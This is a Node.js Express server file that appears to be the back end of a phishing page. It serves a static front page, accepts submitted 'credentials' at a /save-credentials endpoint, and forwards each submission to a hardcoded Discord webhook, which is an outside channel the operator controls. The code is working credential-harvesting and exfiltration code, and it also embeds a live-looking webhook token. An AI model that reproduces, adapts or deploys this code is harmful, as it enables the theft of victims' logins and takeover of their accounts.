const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch'); // Use node-fetch to send HTTP requests

const app = express();
const port = 3000;

// Middleware to parse plain text request bodies
app.use(bodyParser.text({ type: 'text/plain' }));

// Middleware to serve static files from 'public' directory
app.use(express.static('public'));

// Discord webhook URL
const discordWebhookUrl = 'https://discord.com/api/webhooks/1256297119669555352/mMgiWnisGaoKg5mJRa5P_y6kRUb9MdYmXQM8B1iz21s2VqqBcZrVgs9vWHVReECzrIUB';

// Handle POST request to save credentials
app.post('/save-credentials', async (req, res) => {
  const credentials = req.body;

  // Prepare the payload for the Discord webhook
  const payload = {
    content: `New credentials submitted:\n${credentials}`
  };

  try {
    // Send the payload to the Discord webhook
    const response = await fetch(discordWebhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    if (response.ok) {
      console.log('Credentials sent to Discord:', credentials);
      res.status(200).send('Credentials sent successfully.');
    } else {
      console.error('Error sending credentials to Discord:', response.statusText);
      res.status(500).send('Error sending credentials.');
    }
  } catch (error) {
    console.error('Error sending credentials to Discord:', error);
    res.status(500).send('Error sending credentials.');
  }
});

// Serve index.html for the root URL
app.get('/', (req, res) => {
  res.sendFile('index.html', { root: 'public' });
});

// Start server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
